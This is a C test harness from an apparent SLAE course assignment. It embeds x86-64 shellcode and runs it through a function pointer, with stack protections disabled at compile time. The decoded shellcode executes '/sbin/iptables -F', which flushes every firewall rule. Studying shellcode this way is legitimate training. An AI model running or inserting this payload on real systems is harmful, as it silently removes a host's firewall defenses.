/*
Filename:      shellcode-orig.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  03.02.2019
Note:          x64
Compiler:      gcc -ggdb -fno-stack-protector -z execstack shellcode-orig.c -o shellcode-orig
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x48\x31\xc0\x50\x66\x68\x2d\x46\x48\x89\xe1\x48\xbb\xff\xff"
"\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73"
"\x62\x69\x2f\x69\x70\x53\x48\x89\xe7\x50\x51\x57\x48\x89\xe6"
"\xb0\x3b\x0f\x05";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
